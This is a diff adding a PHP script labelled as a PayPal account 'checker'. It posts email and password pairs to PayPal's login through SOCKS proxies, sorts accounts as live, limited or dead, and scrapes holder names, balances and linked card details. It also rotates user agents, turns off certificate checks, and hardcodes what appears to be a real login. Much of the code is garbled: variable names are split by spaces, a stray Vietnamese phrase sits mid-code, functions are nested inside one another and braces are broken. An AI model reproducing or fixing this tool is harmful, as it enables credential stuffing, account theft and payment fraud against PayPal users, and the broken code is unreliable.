@@ -1,0 +1,266 @@
+<?php
+class Paypal{
+###################################################	
+# UNFACEGUY - VSB_UNFACE                          #
+# Check PAYPAL VERSION 2.0(BETA)                  #
+# if you found bug , plz contact Y!M : vsb_unface #
+#                                                 #
+###################################################
+
+
+
+#########################################
+function isVerified($Socks) {
+	//$url = 'https://www.paypal.com/us/cgi-bin/webscr?cmd=_login-submit='.$verifyEmail;
+	$url="https://www.paypal.com/us/cgi-bin/webscr?cmd=_login-submit";
+	$response = $this->curl_get($url,false,$Socks);
+
+	if(strpos($response, '<strong>Why is my account access limited?</strong>'))
+		{
+			return 'LIMIT';
+			
+		}
+
+		else if(strpos($response, '<title>My Account - PayPal</title>'))
+		{
+			preg_match("/<h2>Welcome,([\w\W]*?)<\/h2>/", $response, $matches);
+			preg_match('/<div class="small secondary">([\w\W]*?)<\/div>/', $response, $matches3);
+			preg_match("/Account Type:([\w\W]*?)<\/li>/", $response, $matches1);
+			preg_match('/PayPal balance:([\w\W]*?)<\/span>/', $response, $matches4);
+			//preg_match("/Status:([\w\W]*?)<a/", $response, $matches2);
+			//echo $matches[0].$matches1[0].$matches2[0]; 
+			$ten = substr($matches[0], 12, -5);
+			$lastlogin = substr($matches3[0], 29,-6);
+			//$loai1= substr($matches2[0],7,-2);
+			$money = substr($matches4[0],0,-16);
+			//echo $loai1;
+			if(strpos($response, '<a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_status">Verified</a>')){
+					$loai="Verified";
+				}
+				else 
+				{
+					$loai="Unverified";
+				}
+			return $ten."|".$loai."|".$lastlogin."|".$money;
+		} 
+		else
+		{
+			return 'DIE';
+		}
+	
+		
+
+}
+######################################## CHECK CARD ##########################################
+function isCard($Socks) {
+	//$url = 'https://www.paypal.com/us/verified/pal='.$verifyEmail;
+	$url="https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-credit-card-new-clickthru";
+	$response = $this->curl_get($url,false,$Socks);
+
+	if(strpos($response, '<title>Credit/Debit Cards - PayPal</title>'))
+	{
+		preg_match('/<table class="basic fullTable">([\w\W]*?)<\/table>/', $response, $matches);
+		$Card=$matches[0];
+	}
+	
+	else
+	{
+		$Card="Hem co";
+	}
+	
+	return $Card;
+
+}
+##########################################UR#############N################################F###############3
+
+function isLogin($email,$password,$Socks) {
+	// Get login page 
+	$response = $this->curl_get('https://www.paypal.com/us/cgi-bin/webscr?cmd=_login-run',false,$Socks);
+	$postFields = $this->getHiddenFormInputs($response, 'login_form');
+	if (!$postFields) {
+		return false;
+	}
+	// Post login
+	$postFields['login_email'] = $email;
+	$postFields['login_password'] = $password;
+	$postFields = $this->serializePostFields($postFields);
+	$response = $this->curl_get('https://www.paypal.com/us/cgi-bin/webscr?cmd=_login-submit', $postFields,$Socks);
+	//echo $response;
+	if(!strpos($response, 'login_cmd=_login-done')) {
+		if(strpos($response, '<strong>Your account access is limited.</strong>'))
+		{
+			return 'LIMIT';
+			
+		}
+		else if (strpos($response, '<title>Update account information - PayPal</title>'))
+				{
+					return 'UPDATE';			
+				}
+			else 
+			return 'DIE';
+		
+		//echo " error";
+	} else {
+		return 'OK';
+
+	}
+}
+//-------------------------------Get----------------------------
+function curl_get($url, $postfields=false,$Socks) {
+	static $curl;
+	if(empty($curl)) {
+		$cookiejar = 'curl_cookiejar.txt';
+		@unlink($cookiejar);
+		$ ch = curl_init ();
+curl_setopt ($ ch, CURLOPT_URL, "https://www.paypal.com/us/cgi-bin/webscr?cmd=_login-submit");
+curl_setopt ($ ch, CURLOPT_HEADER, 1);
+curl_setopt ($ ch, CURLOPT_USERAGENT, $ _SERVER [ 'HTTP_USER_AGENT']);
+curl_setopt ($ ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt ($ ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt ($ ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt ($ ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt ($ ch, CURLOPT_COOKIEJAR, 'cookie.txt');
+curl_setopt ($ ch, CURLOPT_COOKIEFILE, 'cookie.txt');
+curl_setopt ($ ch, CURLOPT_VERBOSE, 1);
+curl_setopt ($ ch, CURLOPT_POST, 1);
+$ data = array (
+'login_email' => 'wahibsuwiryo@ymail.com',
+'login_password' => '4d4putr4',
+'target_page' => 0,
+):
+curl_setopt ($ ch, CURLOPT_POSTFIELDS, $ data);
+$ acc = curl_exec ($ ch);
+curl_close ($ ch);
+curl_setopt($curl, function get ($ url) {
+$ ch = curl_init ();
+	
+	}
+curl_setopt ($ ch, CURLOPT_URL, $ url);
+curl_setopt ($ ch, CURLOPT_HEADER, 1);
+curl_setopt ($ ch, CURLOPT_USERAGENT , $ _SERVER [ 'HTTP_USER_AGENT']);
+curl_setopt ($ ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt ($ ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt ($ ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt ($ ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt ($ ch, CURLOPT_COOKIEJAR, 'cookie.txt');
+curl_setopt ($ ch, CURLOPT_COOKIEFILE, 'cookie.txt');
+curl_setopt ($ ch, CURLOPT_VERBOSE, 1);
+$ output = curl_exec ($ ch);
+curl_close ($ ch);
+return $ Output;	
+}
+
+	if ($postfields) {
+		curl_setopt($curl, CURLOPT_POST, 1);	
+		curl_setopt($curl, CURLOPT_POSTFIELDS, $postfields);
+	
+	$response = curl_exec($curl);
+	return $response;if (file_exists ('cookie.txt')) {bỏ liên kết ('cookie.txt');
+function cget($url){
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_HEADER, 1);
+curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
+curl_setopt($ch, CURLOPT_VERBOSE, 1);
+$output = curl_exec($ch);
+curl_close($ch);
+return $output;
+}
+
+
+function cpost($email,$pass){
+$ch =curl_init();
+curl_setopt($ch, CURLOPT_URL, "https://www.paypal.com/us/cgi-bin/webscr?cmd=_login-submit");
+curl_setopt($ch, CURLOPT_HEADER, 1);
+curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
+curl_setopt($ch, CURLOPT_VERBOSE, 1);
+curl_setopt($ch, CURLOPT_POST, 1);
+$data = array(
+'login_email' =>$email,
+'login_password' => $pass,
+'target_page' => 0,
+);
+curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+$acc = curl_exec($ch);
+curl_close($ch);
+if($acc){
+	{
+echo "Alert -> ecurity Measures";
+}elseif(strstr($acc,"Please create a new password for your account/")){
+echo "Required -> create a new password for your account";
+}elseif(strstr($acc,"Update account information")){
+echo "Required -> Update account information";
+}elseif(strstr($acc,'this page appears longer than 5 seconds')){
+$klik = explode('If this page appears longer than 5 seconds, <a href="',$acc);$klik=explode('"',$klik[1]);$link=$klik[0];
+$paypal = cget($link);	
+if($paypal){
+$login= cget("https://www.paypal.com/bh/cgi-bin/webscr?cmd=_account&nav=0.0");
+if(preg_match("/access is limited/", $login)){
+echo "$email -> Access is limited<br/>";	
+}elseif (preg_match('/status">Verified</',$login)){
+$balance=explode('<span class="balance">',$login);$balance=explode('',$balance[1]);$balance=explode('',$balance[1]);
+echo "verified -> ".$balance[0]."<br/>";
+}
+
+}
+}else{
+echo "$email -> Error Login";
+}
+}
+}
+
+$acc=cpost('email@gmail.com','password');
+
+
+
+	
+	<function  random_uagent()>;
+ {
+	$giolac = rand(0,9);
+	switch ($giolac) 
+	{
+	case 0:
+            return "Mozilla/5.0 (Linux; U; Android 2.2; en-us; Nexus One Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1";
+			break;
+	case 1:
+            return "Mozilla/5.0 (Linux; U; Android 2.1; en-us; Nexus One Build/ERD62) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17";
+			break;
+	case 2:
+            return "Mozilla/5.0 (Linux; U; Android 2.1-update1; de-de; HTC Desire 1.19.161.5 Build/ERE27) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17";
+			break;
+	case 3:
+            return "Mozilla/5.0 (Linux; U; Android 1.6; en-us; WOWMobile myTouch 3G Build/unknown) AppleWebKit/528.5+ (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1";
+			break;
+	case 4:
+            return "Mozilla/5.0 (Linux; U; Android 2.2; en-us; DROID2 GLOBAL Build/S273) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1";
+			break;
+	case 5:		
+            return "Mozilla/5.0 (Linux; U; Android 2.2; en-gb; GT-P1000 Build/FROYO) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1";
+			break;
+    case 6:
+			return "Mozilla/5.0 (Linux; U; Android 2.1-update1; de-de; E10i Build/2.0.2.A.0.24) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17";
+			break;
+	case 7:
+			return "Mozilla/5.0 (Linux; U; Android 2.2; en-us; DROID2 GLOBAL Build/S273) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1";
+			break;
+	case 8:        
+			return "Mozilla/5.0 (Linux; U; Android 2.0; en-us; Droid Build/ESD20) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/ 530.17";
+			break;
+    case 9:        
+			return "Mozilla/5.0 (Linux; U; Android 2.2; nl-nl; Desire_A8181 Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1";
+			break;
+ random_uagent();
+?>
+}
